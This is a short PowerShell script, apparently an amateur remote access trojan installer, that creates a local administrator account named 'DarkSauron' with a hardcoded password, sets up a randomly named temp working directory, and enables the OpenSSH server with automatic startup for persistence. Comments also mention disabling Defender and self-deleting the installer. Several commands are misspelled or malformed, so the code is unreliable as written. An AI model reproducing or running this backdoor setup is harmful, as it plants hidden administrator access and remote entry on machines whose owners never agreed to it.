#biulds resources for the  rat
# created by Dark Lord


#random string for direcories
 function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 }
#attemp to disable the defender





#create local admin for the rat 
function create_account {
    [CmdletBinding()] 
    param (
        [string] $uname,
        [securestring] $pword
     )
     begin {
     }
        process {
            New-Location "$uname" -pword $pword-FullName "$uname" -Description "Temporary local admin"
            write-Verbose "$uname local user created" Add-LocalGroupMember -Group "Administrators" -Member "$uname"
            Write-Verbose "$uname added to  teh local administration group"
        }
        end{  
        }

    }
$uname = "DarkSauron"
$pword = (ConvertTo-Securestring "12192003"-AsPlainText -Force)
create_account  -uname $uname -pword $pword



#varaibles

$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location










#enabling  the presistance ssh 
Add-WindowsCapablity -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service  -Name sshd-StartupType 'Automatic' Get-NetFirewallRule - Name *ssh* 


#goto temp ,make working directory

 mkdir $path 
 cd $path 
 

 #self delete
 #cd $initial_dir
 #del installer.ps1







